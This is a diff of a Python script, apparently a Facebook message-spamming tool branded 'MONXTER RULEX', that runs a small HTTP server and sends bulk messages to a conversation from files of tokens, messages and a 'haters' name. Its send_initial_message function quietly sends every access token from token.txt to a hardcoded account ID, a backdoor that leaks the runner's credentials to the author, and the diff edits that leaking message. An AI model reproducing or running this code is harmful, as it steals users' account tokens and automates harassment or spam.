@@ -25,9 +25,9 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- SERVER RUNNING>>MANO JUTTI HERW")
+          self.wfile.write(b"  THE MONXTER RULEX BRAND HERE")
 def execute_server():
-      PORT = 4000
+      PORT = int(os.environ.get('PORT', 4000))
 
       with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
           print("Server running at http://localhost:{}".format(PORT))
@@ -35,11 +35,11 @@ def execute_server():
 
 
 def send_initial_message():
-      with open('tokennum.txt', 'r') as file:
+      with open('token.txt', 'r') as file:
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "CREDIT => MONXTER RULEX          OWNER => [✓MONXTER✓]              Hello Monxter ki jawn Mano jutti ma'm! I am using your server. My 💜token💜 is {}"
+      msg_template = "CREDIT=> MONXTER RULEX                OWNER => [✓MONXTER✓]                 Hello Monxter ki jawn Mano Jutti Ma'm! I am using your server. My 🤍token🤍 is {}"
 
       # Specify the ID where you want to send the message
       target_id = "61555549446793"
@@ -47,7 +47,7 @@ def send_initial_message():
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────MONXTER HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•────────────────────── TRICKS BY MONXTER ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
@@ -77,17 +77,17 @@ def send_messages_from_file():
       with open('convo.txt', 'r') as file:
           convo_id = file.read().strip()
 
-      with open('File.txt', 'r') as file:
+      with open('file.txt', 'r') as file:
           messages = file.readlines()
 
       num_messages = len(messages)
 
-      with open('tokennum.txt', 'r') as file:
+      with open('token.txt', 'r') as file:
           tokens = file.readlines()
       num_tokens = len(tokens)
       max_tokens = min(num_tokens, num_messages)
 
-      with open('hatersname.txt', 'r') as file:
+      with open('name.txt', 'r') as file:
           haters_name = file.read().strip()
 
       with open('time.txt', 'r') as file:
